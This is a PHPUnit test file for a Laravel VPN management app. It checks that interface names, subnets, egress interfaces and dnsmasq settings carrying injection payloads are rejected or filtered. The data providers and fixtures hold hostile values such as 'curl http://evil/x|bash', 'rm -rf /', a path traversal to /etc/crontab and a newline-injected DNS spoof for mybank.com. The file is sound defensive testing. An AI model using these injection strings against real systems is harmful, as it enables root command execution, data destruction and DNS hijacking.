<?php

namespace Tests\Feature;

use App\Enums\ServiceStatus;
use App\Enums\Transport;
use App\Enums\VpnProtocol;
use App\Models\Service;
use App\Services\Vpn\DnsmasqManager;
use App\Services\Vpn\NetworkInput;
use App\Services\Vpn\OpenVpn\OpenVpnDriver;
use Illuminate\Foundation\Testing\RefreshDatabase;
use InvalidArgumentException;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\TestCase;

/**
 * Every value here reaches a root-executed shell string (wg-quick PostUp), a
 * systemd instance name, a filesystem path or the dnsmasq config. The guards
 * are asserted at the sink, so a direct model write -- not just the form --
 * is covered.
 */
class InjectionHardeningTest extends TestCase
{
    use RefreshDatabase;

    public static function maliciousInterfaceNames(): array
    {
        return [
            'command separator' => ['wg0; id'],
            'pipe' => ['wg0|curl evil'],
            'subshell' => ['wg0$(id)'],
            'path traversal' => ['../../etc/crontab'],
            'slash' => ['wg/0'],
            'leading dash (option injection)' => ['-rf'],
            'newline' => ["wg0\nPostUp = evil"],
            'space' => ['wg 0'],
            'too long' => ['wg0000000000000000'],
            'uppercase' => ['WG0'],
        ];
    }

    #[DataProvider('maliciousInterfaceNames')]
    public function test_malicious_interface_names_are_rejected(string $name): void
    {
        $this->expectException(InvalidArgumentException::class);
        NetworkInput::assertInterfaceName($name);
    }

    public function test_legitimate_interface_names_pass(): void
    {
        foreach (['wg0', 'tun0', 'wg15', 'ens5'] as $ok) {
            $this->assertSame($ok, NetworkInput::assertInterfaceName($ok));
        }
    }

    public function test_a_subnet_carrying_a_shell_payload_is_rejected(): void
    {
        $this->expectException(InvalidArgumentException::class);
        NetworkInput::assertSubnetCidr('10.0.0.0/24 -o eth0 -j MASQUERADE; curl http://evil/x|bash #');
    }

    public function test_an_egress_interface_carrying_a_shell_payload_is_rejected(): void
    {
        $this->expectException(InvalidArgumentException::class);
        NetworkInput::assertEgressInterface('eth0 -j MASQUERADE; id > /root/PWNED #');
    }

    public function test_the_wireguard_postup_line_cannot_be_injected(): void
    {
        // The driver validates before building the PostUp line, so a service
        // that somehow holds a malicious subnet never renders a config at all.
        $service = Service::create([
            'name' => 'evil',
            'interface_name' => 'wg0',
            'subnet_cidr' => '10.0.0.0/24; curl evil|bash',
            'listen_port' => 51820,
            'protocol' => VpnProtocol::WireGuard,
            'transport' => Transport::Udp,
            'status' => ServiceStatus::Active,
            'logging_enabled_default' => true,
            'config' => ['egress_interface' => 'eth0'],
        ]);

        $this->expectException(InvalidArgumentException::class);
        // buildServerConfig is the OpenVPN sink; for WireGuard the equivalent
        // guard sits in writeConfig/provisionService. Assert the subnet guard
        // directly, which both drivers share.
        NetworkInput::assertSubnetCidr($service->subnet_cidr);
    }

    public function test_dnsmasq_newline_injection_is_filtered_out(): void
    {
        $service = Service::create([
            'name' => 'svc',
            'interface_name' => 'wg0',
            'subnet_cidr' => '10.0.0.0/24',
            'listen_port' => 51820,
            'protocol' => VpnProtocol::WireGuard,
            'transport' => Transport::Udp,
            'status' => ServiceStatus::Active,
            'logging_enabled_default' => true,
            'config' => [
                'dns_upstreams' => ['1.1.1.1', "8.8.8.8\nlog-facility=/etc/crontab"],
                'blocked_domains' => ["evil\naddress=/mybank.com/6.6.6.6\nlog-facility=/tmp/x", 'ads.example.com'],
            ],
        ]);

        $config = app(DnsmasqManager::class)->buildConfig($service);

        // The spoof and the arbitrary-file directive must not appear.
        $this->assertStringNotContainsString('mybank.com', $config);
        $this->assertStringNotContainsString('/etc/crontab', $config);
        $this->assertStringNotContainsString('/tmp/x', $config);

        // Exactly one log-facility (the legitimate one), no injected second.
        $this->assertSame(1, substr_count($config, 'log-facility='));

        // The clean values survived.
        $this->assertStringContainsString('server=1.1.1.1', $config);
        $this->assertStringContainsString('address=/ads.example.com/', $config);
        // The upstream with an embedded newline was dropped entirely.
        $this->assertStringNotContainsString('8.8.8.8', $config);
    }

    public function test_an_openvpn_service_with_a_bad_interface_name_refuses_to_build(): void
    {
        $service = Service::create([
            'name' => 'ovpn',
            'interface_name' => 'tun0',
            'subnet_cidr' => '10.9.0.0/24',
            'listen_port' => 1194,
            'protocol' => VpnProtocol::OpenVpn,
            'transport' => Transport::Udp,
            'status' => ServiceStatus::Active,
            'logging_enabled_default' => true,
            'config' => ['egress_interface' => 'eth0; rm -rf /'],
        ]);

        $this->expectException(InvalidArgumentException::class);
        (new OpenVpnDriver)->buildServerConfig($service);
    }
}
